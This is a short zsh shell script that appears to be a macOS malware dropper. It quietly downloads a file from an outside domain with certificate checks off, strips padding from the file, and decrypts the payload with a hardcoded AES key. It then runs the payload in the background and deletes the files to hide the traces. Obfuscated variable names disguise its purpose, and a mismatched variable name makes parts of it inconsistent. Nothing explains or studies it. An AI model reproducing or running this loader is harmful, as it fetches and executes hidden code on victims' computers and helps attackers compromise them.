#!/bin/zsh
sp3js=$(mktemp /tmp/9tv22w.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mcf82432627bbf781.bin" -o "$sp3jsz" || exit 1
vaqfvm=$(stat -f %z "$sp3jsz"); crktcr8=$(( vaqfvm - 1481 - 1909 ))
tail -c +$(( 1481 + 1 )) "$sp3jsz" | head -c $crktcr8 | openssl enc -d -aes-256-cbc -k 7ce227a51b158828d891917c -out "$sp3js" 2>/dev/null
[ -s "$sp3js" ] && chmod 700 "$sp3js" && ( "$sp3js" & ) && disown
( sleep 3; rm -f "$sp3js" "$sp3jsz" ) &>/dev/null &
